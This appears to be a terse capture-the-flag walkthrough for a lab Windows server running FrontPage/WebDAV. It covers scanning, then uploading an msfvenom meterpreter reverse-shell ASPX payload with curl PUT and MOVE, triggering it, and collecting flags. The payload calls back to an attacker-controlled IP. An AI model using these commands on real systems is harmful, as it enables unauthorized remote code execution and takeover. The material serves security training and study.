started with an nmap scan

ran a ffuf using common.txt

ran the vulnerability nmap script and found that this server is running the Microsoft FrontPage Extension

upon reading the [NMAP LINK](http://insecure.org/sploits/Microsoft.frontpage.insecurities.html), we are told frontpage visits `domain/_vti_inf.html` when it needs to publish files **(GET)**

then it'll posts the file to `domain/_vti_bin/shtml.exe/_vti_rpc` **(POST)** 

server binary is not password protected so it is possible to post a query to it

we will attempt to post a file on the server using curl

we use davtest to see which filetypes can be sent
`davtest -url http://10.10.10.15

notice that aspx files cannot be sent but txt files can
we'll upload a reverse shell generated with msfvenom as a txt file and then rename it using the MOVE function using curl
then start a meterpreter session and simply curl the link to start our reverse shell

`msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.14.20" LPORT=1111 -f aspx > COOL.aspx`

`curl -X PUT http://10.10.10.15/shell.txt --data-binary @COOL.aspx`

`curl -X MOVE -H 'Destination: http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt`

meterpreter:
use multi handler
set payload to reverse windows tcp
set lhost and lport
exploit

`curl http://10.10.10.15/shell.aspx`

`meterpreter> getuid`

traverse directory to documents and settings > users > find flags

